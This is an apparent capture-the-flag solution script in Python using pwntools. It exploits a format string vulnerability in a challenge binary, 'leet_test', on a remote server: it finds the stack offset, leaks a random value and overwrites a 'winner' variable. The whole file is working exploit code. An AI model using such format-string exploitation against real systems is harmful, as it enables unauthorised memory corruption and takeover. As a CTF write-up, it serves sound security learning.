from pwn import *

LOCAL = False
elf = context.binary = ELF('./leet_test', checksec=False)
# context.log_level = 'debug'
if LOCAL:
	p = elf.process()
else:
	p = remote('138.68.148.149', '30235')

'''
There's a format string vulnerability (in main()), so we'll be writing the correct value into "winner" address
'''

# Finding stack-offset
p.sendlineafter("Please enter your name: ", "AAAAAAAA" + " ".join(["%p"]*50))
stack_offset = p.recvline().split(" ").index("0x4141414141414141")

winner = 0x404078

# Leaking random-var's value
payload = "%7$p"
p.sendlineafter("Please enter your name: ", payload)
p.recvuntil("Hello, ")
random_var = p.recvline()[-13:-9]
log.info("Leaked random-var's value: " + random_var)
random_var = int(random_var, 16)

multiplication = random_var * 0x1337c0de

def exec_fmt(payload):
	p.sendlineafter("Please enter your name: ", payload)
	return p.recvuntil("Come right in! ")

f = FmtStr(exec_fmt, offset=stack_offset)
f.write(winner, multiplication)
f.execute_writes()

success(p.recv())